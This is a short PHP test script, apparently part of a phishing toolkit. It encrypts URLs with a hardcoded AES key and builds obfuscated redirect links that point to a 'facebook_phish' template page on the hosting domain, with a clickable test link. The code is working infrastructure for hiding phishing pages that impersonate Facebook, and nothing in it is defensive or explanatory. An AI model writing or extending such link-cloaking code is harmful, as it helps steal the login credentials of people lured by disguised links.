<?php
// Simple test script to verify encryption/decryption
define('ENCRYPTION_KEY', 'StormBreaker2025SecretKey!@#');

function encryptUrl($url) {
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    $encrypted = openssl_encrypt($url, 'aes-256-cbc', ENCRYPTION_KEY, 0, $iv);
    return base64_encode($encrypted . '::' . $iv);
}

function decryptUrl($encrypted) {
    try {
        $data = base64_decode($encrypted);
        if ($data === false) return false;
        
        $parts = explode('::', $data, 2);
        if (count($parts) !== 2) return false;
        
        list($encrypted_data, $iv) = $parts;
        $decrypted = openssl_decrypt($encrypted_data, 'aes-256-cbc', ENCRYPTION_KEY, 0, $iv);
        return $decrypted;
    } catch (Exception $e) {
        return false;
    }
}

// Test encryption
$testUrl = 'http://example.com/templates/facebook_phish/index.html';
$encrypted = encryptUrl($testUrl);
$decrypted = decryptUrl($encrypted);

echo "<h2>Encryption Test</h2>";
echo "<p><strong>Original URL:</strong> $testUrl</p>";
echo "<p><strong>Encrypted:</strong> $encrypted</p>";
echo "<p><strong>Decrypted:</strong> $decrypted</p>";
echo "<p><strong>Match:</strong> " . ($testUrl === $decrypted ? 'YES ✓' : 'NO ✗') . "</p>";

// Test current domain
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'];
$baseUrl = $protocol . '://' . $host;

echo "<h2>Current Domain</h2>";
echo "<p><strong>Base URL:</strong> $baseUrl</p>";
echo "<p><strong>Full Path:</strong> " . $baseUrl . $_SERVER['REQUEST_URI'] . "</p>";

// Generate sample encrypted link
$samplePath = 'templates/facebook_phish/index.html';
$fullUrl = $baseUrl . '/' . $samplePath;
$encryptedLink = encryptUrl($fullUrl);
$redirectUrl = $baseUrl . '/redirect.php?id=' . urlencode($encryptedLink);

echo "<h2>Sample Link</h2>";
echo "<p><strong>Template Path:</strong> $samplePath</p>";
echo "<p><strong>Full URL:</strong> $fullUrl</p>";
echo "<p><strong>Encrypted ID:</strong> $encryptedLink</p>";
echo "<p><strong>Redirect URL:</strong> <a href='$redirectUrl' target='_blank'>$redirectUrl</a></p>";
echo "<p><a href='$redirectUrl' target='_blank'>Click to test redirect</a></p>";
?>
<style>
    body { font-family: Arial; padding: 20px; background: #f0f0f0; }
    h2 { color: #667eea; margin-top: 30px; }
    p { background: white; padding: 10px; margin: 5px 0; border-radius: 5px; word-break: break-all; }
    strong { color: #333; }
</style>
